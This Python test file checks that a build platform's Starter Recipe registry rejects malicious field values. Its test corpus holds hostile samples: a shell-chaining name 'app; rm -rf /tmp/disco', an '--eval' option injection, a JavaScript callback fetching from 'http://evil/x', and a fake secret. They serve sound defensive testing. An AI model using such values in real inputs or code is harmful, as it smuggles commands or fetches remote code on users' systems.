"""Focused tests for the Starter Recipe schema and registry entry (16-S2).

These exercise the production ``starter_recipes`` module directly — the frozen
versioned ``StarterRecipe`` record, its bounded typed value surface, and the
deterministic, fail-closed ``StarterRecipeRegistry`` — never a serialized
fixture or prose-only descriptor.  The slice is restricted to the Starter
Recipe schema and its bounded registry entry: no selection, prompt injection,
direct-reference workflow, persistence/ejection, provider, runtime-effect,
Library Recipe, trust evaluation, precedence, provenance/BOM, or
guided-authoring channel is added.

Required resolved behavior and controls covered:

- A versioned Starter Recipe record carries engine, profile, target, trust,
  required-capability, scaffold-mount, and ``R-LATENT/v1`` binding explicitly
  (no scope is implicit in a label).
- The bounded typed value surface binds the frozen R-LATENT/v1 Starter corpus
  value fields (``name``, ``extra_args``, ``init``, ``note``, ``payload``,
  ``src``, ``build_command``) — no ``dict[str, Any]`` escape.
- Registration applies the frozen ``R-LATENT/v1`` classification to the value
  surface and fails closed on the Starter positives POS-001, POS-005, POS-008,
  POS-011, POS-015 while accepting the Starter negatives NEG-001, NEG-006,
  NEG-008 (the declared command field is a legitimate command surface).
- The corpus values below reproduce the exact frozen R-LATENT/v1 Starter cases
  (``R-LATENT-CORPUS-v1.json``); IDs are not merely mentioned in comments.
- Registration and exact resolution are deterministic and fail closed for
  unsupported schema versions, unsupported R-LATENT bindings, non-scaffold
  mounts, duplicate identities, engine/profile/target/capability scope
  mismatches, distinct-concept ID reuse, and a non-clean value-surface verdict.
- Mutation/negative controls prove removal of each required field/binding,
  guard, duplicate identity, wrong scope, denied capability widening,
  non-scaffold mount, unsupported version, and foreign identity would fail.
"""

from __future__ import annotations

import pytest
from disco.core.build_platform import (
    APPKIT_ENGINE_ID,
    APPKIT_PROFILE_ID,
    FREEFORM_ENGINE_ID,
    FREEFORM_PROFILE_ID,
    WEB_TARGET_ID,
    BuiltinInputMount,
    ComponentId,
    TrustLevel,
)
from disco.core.build_platform.starter_recipes import (
    SUPPORTED_R_LATENT_VERSION,
    SUPPORTED_STARTER_RECIPE_SCHEMA_VERSION,
    StarterClassification,
    StarterRecipe,
    StarterRecipeError,
    StarterRecipeRegistry,
    StarterRecipeValues,
    classify_starter_values,
)

# Exact value fields/values of the frozen R-LATENT/v1 Starter Recipe corpus
# cases (R-LATENT-CORPUS-v1.json), reproduced verbatim so the corpus is
# exercised, not merely cited by ID.
CORPUS_POS = {
    "POS-001": {
        "field": "name",
        "value": "app; rm -rf /tmp/disco",
        "expect": "parameter_smuggling",
    },
    "POS-005": {"field": "extra_args", "value": "--eval", "expect": "parameter_smuggling"},
    "POS-008": {
        "field": "init",
        "value": "() => fetch('http://evil/x').then(r => r.text())",
        "expect": "hidden_executable",
    },
    "POS-011": {
        "field": "note",
        "value": "deployment password: s3cr3t-token-abc123",
        "expect": "credential_leak",
    },
    "POS-015": {"field": "payload", "expect": "unbounded_input", "oversize_document": True},
}
CORPUS_NEG = {
    "NEG-001": {"field": "name", "value": "Acme Landing", "expect": "clean"},
    "NEG-006": {"field": "src", "value": "pages/index.ts", "expect": "clean"},
    "NEG-008": {"field": "build_command", "value": "next build", "expect": "clean"},
}


def _recipe_id(name: str) -> ComponentId:
    return ComponentId(namespace="disco_starter", name=name, version="1")


def _values(**kwargs) -> StarterRecipeValues:
    return StarterRecipeValues(**kwargs)


def _recipe(
    *,
    name: str = "demo",
    schema_version: int = SUPPORTED_STARTER_RECIPE_SCHEMA_VERSION,
    engine: ComponentId = FREEFORM_ENGINE_ID,
    profile: ComponentId = FREEFORM_PROFILE_ID,
    target: ComponentId = WEB_TARGET_ID,
    trust: TrustLevel = TrustLevel.TRUSTED_LOCAL,
    required_capabilities: frozenset[str] = frozenset(),
    scaffold_mount: BuiltinInputMount = BuiltinInputMount.SCAFFOLD,
    r_latent_version: str = SUPPORTED_R_LATENT_VERSION,
    values: StarterRecipeValues | None = None,
) -> StarterRecipe:
    return StarterRecipe(
        id=_recipe_id(name),
        schema_version=schema_version,
        engine=engine,
        profile=profile,
        target=target,
        trust=trust,
        required_capabilities=required_capabilities,
        scaffold_mount=scaffold_mount,
        r_latent_version=r_latent_version,
        values=StarterRecipeValues() if values is None else values,
    )


# ---------------------------------------------------------------------------
# The frozen R-LATENT/v1 Starter corpus is reproduced, not cited
# ---------------------------------------------------------------------------


def test_frozen_starter_corpus_is_reproduced() -> None:
    assert set(CORPUS_POS) == {"POS-001", "POS-005", "POS-008", "POS-011", "POS-015"}
    assert set(CORPUS_NEG) == {"NEG-001", "NEG-006", "NEG-008"}
    # The corpus value fields are exactly the value fields this schema binds.
    fields = {item["field"] for item in (*CORPUS_POS.values(), *CORPUS_NEG.values())}
    assert fields == {"name", "extra_args", "init", "note", "payload", "src", "build_command"}
    # The frozen expectation values are exact.
    assert CORPUS_POS["POS-001"]["value"] == "app; rm -rf /tmp/disco"
    assert CORPUS_NEG["NEG-008"]["value"] == "next build"


# ---------------------------------------------------------------------------
# Positive corpus controls — must reject with the frozen classification
# ---------------------------------------------------------------------------


def test_corpus_pos001_shell_chain_rejected() -> None:
    # POS-001: field `name`, value `app; rm -rf /tmp/disco` -> parameter_smuggling (R1).
    item = CORPUS_POS["POS-001"]
    values = _values(name=item["value"])
    assert classify_starter_values(values) == StarterClassification(
        verdict="parameter_smuggling", rule="R1"
    )
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=values))


def test_corpus_pos005_bare_option_rejected() -> None:
    # POS-005: field `extra_args`, value `--eval` -> parameter_smuggling (R3).
    item = CORPUS_POS["POS-005"]
    values = _values(extra_args=item["value"])
    assert classify_starter_values(values) == StarterClassification(
        verdict="parameter_smuggling", rule="R3"
    )
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=values))


def test_corpus_pos008_callback_closure_rejected() -> None:
    # POS-008: field `init`, value `() => fetch('http://evil/x').then(r => r.text())`
    # -> hidden_executable (R6).  The callback closure is a hidden executable, not
    # a data value.
    item = CORPUS_POS["POS-008"]
    values = _values(init=item["value"])
    assert classify_starter_values(values) == StarterClassification(
        verdict="hidden_executable", rule="R6"
    )
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=values))


def test_corpus_pos011_credential_leak_rejected() -> None:
    # POS-011: field `note`, value `deployment password: s3cr3t-token-abc123`
    # -> credential_leak (R8).  A doc field does not exempt a secret-shaped value.
    item = CORPUS_POS["POS-011"]
    values = _values(note=item["value"])
    assert classify_starter_values(values) == StarterClassification(
        verdict="credential_leak", rule="R8"
    )
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=values))


def test_corpus_pos015_oversize_document_rejected() -> None:
    # POS-015: field `payload`, whole document exceeds the bounded cap while
    # individual values stay ordinary and bounded -> unbounded_input (R11).
    item = CORPUS_POS["POS-015"]
    assert item["field"] == "payload"
    assert item["oversize_document"] is True
    values = _values(payload=tuple("ordinary-data" * 12 for _ in range(3000)))
    assert classify_starter_values(values) == StarterClassification(
        verdict="unbounded_input", rule="R11"
    )
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=values))


# ---------------------------------------------------------------------------
# Negative corpus controls — legitimate values must accept and resolve
# ---------------------------------------------------------------------------


def test_corpus_neg001_plain_name_accepts_and_resolves() -> None:
    # NEG-001: field `name`, value `Acme Landing` -> clean (LC1).
    item = CORPUS_NEG["NEG-001"]
    values = _values(name=item["value"])
    assert classify_starter_values(values).verdict == "clean"
    registry = StarterRecipeRegistry()
    registry.register(_recipe(values=values))
    resolved = registry.resolve(_recipe_id("demo"))
    assert resolved.id.name == "demo"
    assert resolved.values.name == item["value"]
    assert resolved.r_latent_version == SUPPORTED_R_LATENT_VERSION


def test_corpus_neg006_in_root_path_accepts_and_resolves() -> None:
    # NEG-006: field `src`, value `pages/index.ts` -> clean (LC4 path within root).
    item = CORPUS_NEG["NEG-006"]
    values = _values(src=item["value"])
    assert classify_starter_values(values).verdict == "clean"
    registry = StarterRecipeRegistry()
    registry.register(_recipe(values=values))
    assert registry.resolve(_recipe_id("demo")).values.src == item["value"]


def test_corpus_neg008_declared_command_accepts_and_resolves() -> None:
    # NEG-008: field `build_command`, value `next build` -> clean (LC6).  The
    # declared command field is the schema's own command surface, never latent.
    item = CORPUS_NEG["NEG-008"]
    assert item["field"] == "build_command"
    values = _values(build_command=item["value"])
    assert classify_starter_values(values).verdict == "clean"
    registry = StarterRecipeRegistry()
    registry.register(_recipe(values=values))
    assert registry.resolve(_recipe_id("demo")).values.build_command == item["value"]


# ---------------------------------------------------------------------------
# Positive controls — resolved production behavior and typed value surface
# ---------------------------------------------------------------------------


def test_resolved_record_carries_explicit_scope_and_values() -> None:
    recipe = _recipe(
        engine=FREEFORM_ENGINE_ID,
        profile=FREEFORM_PROFILE_ID,
        target=WEB_TARGET_ID,
        trust=TrustLevel.TRUSTED_LOCAL,
        required_capabilities=frozenset({"workspace.read"}),
        values=_values(name="Acme", build_command="next build", payload=("pages", "api")),
    )
    registry = StarterRecipeRegistry()
    registry.register(recipe)
    resolved = registry.resolve(recipe.id)
    assert resolved.schema_version == SUPPORTED_STARTER_RECIPE_SCHEMA_VERSION
    assert resolved.engine == FREEFORM_ENGINE_ID
    assert resolved.profile == FREEFORM_PROFILE_ID
    assert resolved.target == WEB_TARGET_ID
    assert resolved.trust is TrustLevel.TRUSTED_LOCAL
    assert resolved.required_capabilities == frozenset({"workspace.read"})
    assert resolved.scaffold_mount is BuiltinInputMount.SCAFFOLD
    assert resolved.r_latent_version == SUPPORTED_R_LATENT_VERSION
    assert resolved.values.name == "Acme"
    assert resolved.values.build_command == "next build"
    assert resolved.values.payload == ("pages", "api")


def test_appkit_scoped_record_resolves_with_distinct_scope() -> None:
    recipe = _recipe(
        name="appkit_demo",
        engine=APPKIT_ENGINE_ID,
        profile=APPKIT_PROFILE_ID,
        target=WEB_TARGET_ID,
        trust=TrustLevel.TRUSTED_LOCAL,
    )
    registry = StarterRecipeRegistry()
    registry.register(recipe)
    resolved = registry.resolve(recipe.id)
    assert resolved.engine == APPKIT_ENGINE_ID
    assert resolved.profile == APPKIT_PROFILE_ID
    assert resolved.target == WEB_TARGET_ID


def test_untrusted_recipe_carries_explicit_trust_tier() -> None:
    recipe = _recipe(name="portable", trust=TrustLevel.UNTRUSTED_PORTABLE)
    registry = StarterRecipeRegistry()
    registry.register(recipe)
    resolved = registry.resolve(recipe.id)
    assert resolved.trust is TrustLevel.UNTRUSTED_PORTABLE
    assert resolved.scaffold_mount is BuiltinInputMount.SCAFFOLD


def test_registration_and_resolution_are_deterministic() -> None:
    first = StarterRecipeRegistry()
    second = StarterRecipeRegistry()
    recipe = _recipe()
    first.register(recipe)
    second.register(recipe)
    assert first.resolve(recipe.id) == second.resolve(recipe.id)
    assert first.ids() == second.ids()
    assert first.ids() == (recipe.id.canonical,)


def test_ids_are_sorted_deterministically() -> None:
    registry = StarterRecipeRegistry()
    registry.register(_recipe(name="b"))
    registry.register(_recipe(name="a"))
    assert registry.ids() == (
        "disco_starter.a@1",
        "disco_starter.b@1",
    )


def test_value_surface_is_typed_and_closed() -> None:
    # The value surface is a bounded, typed schema-owned representation, not an
    # unbounded executable ``dict[str, Any]`` escape.  An unknown value field is
    # rejected by the frozen schema rather than smuggled through a mapping.
    with pytest.raises(ValueError):
        StarterRecipeValues(**{"name": "x", "unknown_field": "y"})


# ---------------------------------------------------------------------------
# Unsupported schema version
# ---------------------------------------------------------------------------


def test_unsupported_schema_version_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="unsupported starter recipe schema version"):
        registry.register(_recipe(schema_version=2))


def test_unsupported_schema_version_does_not_register() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError):
        registry.register(_recipe(name="never", schema_version=99))
    with pytest.raises(StarterRecipeError, match="is not registered"):
        registry.resolve(_recipe_id("never"))


# ---------------------------------------------------------------------------
# R-LATENT binding, scaffold-mount, and value-surface guards
# ---------------------------------------------------------------------------


def test_wrong_r_latent_binding_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="unsupported R-LATENT binding"):
        registry.register(_recipe(name="bad_latent", r_latent_version="R-LATENT/v2"))


def test_non_scaffold_mount_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="host scaffold axis"):
        registry.register(_recipe(name="bad_mount", scaffold_mount=BuiltinInputMount.CONTEXT))


# ---------------------------------------------------------------------------
# Duplicate identity
# ---------------------------------------------------------------------------


def test_duplicate_identity_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    registry.register(_recipe())
    with pytest.raises(StarterRecipeError, match="duplicate starter recipe id"):
        registry.register(_recipe())


# ---------------------------------------------------------------------------
# Wrong engine/profile/target scope
# ---------------------------------------------------------------------------


def test_wrong_engine_profile_scope_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="engine/profile scope mismatch"):
        registry.register(
            _recipe(name="mismatch", engine=APPKIT_ENGINE_ID, profile=FREEFORM_PROFILE_ID)
        )


def test_unknown_engine_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="not a known construction engine"):
        registry.register(
            _recipe(
                name="bad_engine",
                engine=ComponentId(namespace="disco", name="unknown_engine", version="1"),
            )
        )


def test_unknown_profile_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="not a known build profile"):
        registry.register(
            _recipe(
                name="bad_profile",
                profile=ComponentId(namespace="disco", name="unknown_profile", version="1"),
            )
        )


def test_unknown_target_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="not a known target"):
        registry.register(
            _recipe(
                name="bad_target",
                target=ComponentId(namespace="disco", name="unknown_target", version="1"),
            )
        )


# ---------------------------------------------------------------------------
# Denied capability widening
# ---------------------------------------------------------------------------


def test_capability_widening_fails_closed() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="capability widening denied"):
        registry.register(_recipe(required_capabilities=frozenset({"host.elevated_admin"})))


# ---------------------------------------------------------------------------
# Distinct typed identity — never a Reference Pack / Library Recipe / AppKit /
# Freeform / target / persisted-profile / host-catalog identity
# ---------------------------------------------------------------------------


def test_foreign_engine_or_profile_or_target_id_is_rejected() -> None:
    registry = StarterRecipeRegistry()
    for foreign in (
        APPKIT_ENGINE_ID,
        APPKIT_PROFILE_ID,
        FREEFORM_ENGINE_ID,
        FREEFORM_PROFILE_ID,
        WEB_TARGET_ID,
    ):
        with pytest.raises(StarterRecipeError, match="namespace"):
            registry.register(
                StarterRecipe(
                    id=foreign,
                    engine=FREEFORM_ENGINE_ID,
                    profile=FREEFORM_PROFILE_ID,
                    target=WEB_TARGET_ID,
                    trust=TrustLevel.TRUSTED_LOCAL,
                )
            )


def test_reference_pack_namespace_id_is_rejected() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="disco_starter namespace"):
        registry.register(
            StarterRecipe(
                id=ComponentId(namespace="disco_refpack", name="demo", version="1"),
                engine=FREEFORM_ENGINE_ID,
                profile=FREEFORM_PROFILE_ID,
                target=WEB_TARGET_ID,
                trust=TrustLevel.TRUSTED_LOCAL,
            )
        )


def test_host_catalog_namespace_id_is_rejected() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="disco_starter namespace"):
        registry.register(
            StarterRecipe(
                id=ComponentId(namespace="disco_builtin", name="starter_app_shell", version="1"),
                engine=FREEFORM_ENGINE_ID,
                profile=FREEFORM_PROFILE_ID,
                target=WEB_TARGET_ID,
                trust=TrustLevel.TRUSTED_LOCAL,
            )
        )


def test_foreign_namespace_id_is_rejected() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="disco_starter namespace"):
        registry.register(
            StarterRecipe(
                id=ComponentId(namespace="disco", name="demo_recipe", version="1"),
                engine=FREEFORM_ENGINE_ID,
                profile=FREEFORM_PROFILE_ID,
                target=WEB_TARGET_ID,
                trust=TrustLevel.TRUSTED_LOCAL,
            )
        )


# ---------------------------------------------------------------------------
# Trust / scaffold distinction (not selection, not a Library Recipe)
# ---------------------------------------------------------------------------


def test_trust_tier_is_explicit_and_never_implicit_in_a_label() -> None:
    registry = StarterRecipeRegistry()
    host = _recipe(name="host_policy", trust=TrustLevel.HOST_POLICY)
    local = _recipe(name="trusted_local", trust=TrustLevel.TRUSTED_LOCAL)
    registry.register(host)
    registry.register(local)
    assert registry.resolve(host.id).trust is TrustLevel.HOST_POLICY
    assert registry.resolve(local.id).trust is TrustLevel.TRUSTED_LOCAL


# ---------------------------------------------------------------------------
# Mutation / negative controls — rule or binding removal must fail
# ---------------------------------------------------------------------------


def test_mutation_unsupported_version_rejection_depends_on_the_check() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="unsupported"):
        registry.register(_recipe(schema_version=2))
    assert registry.ids() == ()


def test_mutation_duplicate_rejection_depends_on_the_check() -> None:
    registry = StarterRecipeRegistry()
    registry.register(_recipe())
    with pytest.raises(StarterRecipeError, match="duplicate"):
        registry.register(_recipe())
    assert registry.ids() == ("disco_starter.demo@1",)


def test_mutation_r_latent_binding_rejection_depends_on_the_check() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="R-LATENT"):
        registry.register(_recipe(name="bad_latent", r_latent_version="R-LATENT/v2"))
    assert registry.ids() == ()


def test_mutation_scaffold_mount_rejection_depends_on_the_check() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="scaffold"):
        registry.register(_recipe(name="bad_mount", scaffold_mount=BuiltinInputMount.CONSTRUCTION))
    assert registry.ids() == ()


def test_mutation_capability_widening_rejection_depends_on_the_check() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="capability"):
        registry.register(_recipe(required_capabilities=frozenset({"host.elevated_admin"})))
    assert registry.ids() == ()


def test_mutation_foreign_namespace_rejection_depends_on_the_check() -> None:
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="namespace"):
        registry.register(
            StarterRecipe(
                id=ComponentId(namespace="disco_refpack", name="demo", version="1"),
                engine=FREEFORM_ENGINE_ID,
                profile=FREEFORM_PROFILE_ID,
                target=WEB_TARGET_ID,
                trust=TrustLevel.TRUSTED_LOCAL,
            )
        )
    assert registry.ids() == ()


def test_mutation_corpus_positive_rejection_depends_on_the_guard() -> None:
    # Without the value-surface validation guard, a latent Starter value (POS-001)
    # would register.  This control proves the R-LATENT/v1 classification is load
    # bearing at the production registry path and nothing latent is silently
    # admitted as a scaffold-only recipe.
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=_values(name=CORPUS_POS["POS-001"]["value"])))
    assert registry.ids() == ()


def test_mutation_each_required_value_field_is_bound() -> None:
    # Removing a required value field from the typed surface must change behavior:
    # a latent value placed in that field must be rejected, proving each field is
    # schema-bound rather than a no-op annotation.  The ``payload`` field is the
    # typed (non-``dict[str, Any]``) carrier of POS-015 and rejects an oversize
    # document.
    registry = StarterRecipeRegistry()
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=_values(init=CORPUS_POS["POS-008"]["value"])))
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=_values(note=CORPUS_POS["POS-011"]["value"])))
    with pytest.raises(StarterRecipeError, match="value surface rejected"):
        registry.register(_recipe(values=_values(extra_args=CORPUS_POS["POS-005"]["value"])))
    assert registry.ids() == ()
